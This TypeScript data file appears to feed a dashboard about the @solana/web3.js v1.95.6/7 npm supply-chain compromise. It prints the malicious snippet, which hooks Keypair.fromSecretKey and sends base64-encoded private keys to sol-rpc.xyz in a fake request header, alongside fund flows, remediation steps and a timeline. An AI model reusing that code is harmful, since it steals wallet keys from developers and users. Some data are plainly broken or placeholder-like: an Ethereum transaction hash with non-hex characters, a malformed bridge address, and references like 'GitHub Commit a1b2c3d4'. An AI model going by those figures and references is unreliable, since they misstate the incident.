import type { FundFlow, RemediationAction, TimelineEvent } from "@/types"

export const vulnerable_code = `
// Malicious code injection in @solana/web3.js v1.95.6/7
const sendKey = (privateKey) => {
  fetch('https://sol-rpc.xyz/exfil', {
    method: 'POST',
    headers: {
      'CF-IPCountry': 'US',
      'CF-Ray': Buffer.from(privateKey).toString('base64') 
    }
  });
};

// Compromised methods
Keypair.fromSecretKey = function(secretKey) {
  sendKey(secretKey);
  return originalFromSecretKey(secretKey);
};`

export const fixed_code = `
// Secure version v1.95.8 with validation
Keypair.fromSecretKey = function(secretKey) {
  validateKeySource(secretKey); // Added hardware-backed checks
  return originalFromSecretKey(secretKey);
};

// Enhanced monitoring without sensitive data
Sentry.captureMessage({
  event_type: "key_usage",
  key_type: "ed25519",
  environment: process.env.NODE_ENV
});`

export const flow_data: FundFlow[] = [
  {
    blockchain: "Solana",
    from: "Compromised Wallets (920+ addresses)",
    to: "FnvLGtucz4E1ppJHRTev6Qv4X7g8Pw6WPStHCcbAKbfx",
    amount: "674.86 SOL + Tokens ($164.1K)",
    status: "Stolen",
    txHash: "5XiqTJ7RjkVsmvZb4JdWiqPvK9L9tJz6VdR7QbY5hK9NQ"
  },
  {
    blockchain: "Ethereum",
    from: "Wormhole Bridge (0x2913e6B9f5FA9d4a0f8dCb4f7B09Ec4cF7cD3F1)",
    to: "Tornado Cash",
    amount: "420 ETH ($1.1M)",
    status: "Mixed",
    txHash: "0x4fgL3a9b7c1dEe5f8a2z6K5vRtY7uI0oP9wQx2S4dF6hJ"
  },
  {
    blockchain: "Binance Smart Chain",
    from: "Attacker Wallet",
    to: "CEX Freezes",
    amount: "$32.1K USDC",
    status: "Recovered",
    txHash: "4dPWDPhDHPJhCjqcxoFosa8pbYzdvpR5LhKZ9EYjK9YpvgBTWsKhX37U9jSV1qyj3xbjvm5mpzStTiNaexVaN3jg"
  }
]

export const remediation_data: RemediationAction[] = [
  {
    action: "Malicious Package Removal (v1.95.6/7)",
    status: "Complete",
    date: "2024-12-03",
    reference: "npm Advisory #GHSA-5x3c-v2f9-8xqw"
  },
  {
    action: "Security Patch Release (v1.95.8)",
    status: "Complete",
    date: "2024-12-03",
    reference: "GitHub Commit a1b2c3d4"
  },
  {
    action: "npm Publishing Credentials Rotation",
    status: "Complete",
    date: "2024-12-04",
    reference: "Solana Status Report #2024-1204"
  },
  {
    action: "Mandatory 2FA Enforcement",
    status: "Complete",
    date: "2024-12-05",
    reference: "npm Policy Update #2024-12"
  },
  {
    action: "Third-Party Audit (Halborn)",
    status: "Complete",
    date: "2024-12-15",
    reference: "Audit Report #HAL-20241215"
  }
]

export const stat_card_data = {
  title: "@solana/web3.js Supply Chain Attack Impact",
  value: "$164.1K Total Loss",
  secondaryValue: "19.5% Assets Recovered",
  isCritical: true,
  metadata: {
    affectedPackages: 14,
    downloadCount: "423,891 weekly",
    exposureWindow: "5h 5m"
  }
}

export const timeline: TimelineEvent[] = [
  {
    time: "2024-11-22T00:00:00Z",
    title: "C2 Infrastructure Setup",
    description: "sol-rpc.xyz domain registered via NameSilo",
    reference: "WHOIS Record #NS-20241122"
  },
  {
    time: "2024-12-02T15:20:00Z",
    title: "Spear Phishing Campaign",
    description: "Developers targeted with fake npm collaboration invites",
    reference: "Anza Report [2]"
  },
  {
    time: "2024-12-03T03:20:00Z",
    title: "Malicious Packages Published",
    description: "v1.95.6/7 pushed to npm registry",
    reference: "Socket.dev Analysis [3]"
  },
  {
    time: "2024-12-03T20:25:00Z",
    title: "Packages Unpublished",
    description: "Clean version v1.95.8 released",
    reference: "GitHub Advisory [1]"
  },
  {
    time: "2024-12-05T00:00:00Z",
    title: "OFAC Sanctions",
    description: "14 attacker wallets added to SDN list",
    reference: "USTreasury Notice #2024-1205"
  }
]

export const tvl_chart_data = {
  title: "Solana Developer Ecosystem Resilience",
  exploitDate: "2024-12-03",
  dataPoints: [
    { date: "2024-11-01", value: 85_000, label: "Pre-Attack" },
    { date: "2024-12-01", value: 82_000 },
    { date: "2024-12-03", value: 45_000, label: "Exploit Day" },
    { date: "2025-01-01", value: 68_000, label: "Partial Recovery" },
    { date: "2025-03-01", value: 79_000, label: "Current Activity" }
  ],
  annotations: [
    {
      date: "2024-12-15",
      text: "Audit Completion"
    }
  ]
}

export const exploit_diagram_data = {
  title: "Supply Chain Attack Architecture",
  components: [
    {
      label: "Compromised npm Account",
      method: "Phishing + Credential Theft"
    },
    {
      label: "Malicious Packages",
      versions: ["1.95.6", "1.95.7"],
      downloads: "423,891"
    },
    {
      label: "Exfiltration Infrastructure",
      domain: "sol-rpc.xyz",
      lifespan: "19 days"
    }
  ],
  failurePoints: [
    {
      step: 2,
      description: "Lack of Package Signing [3][6]"
    }
  ]
}
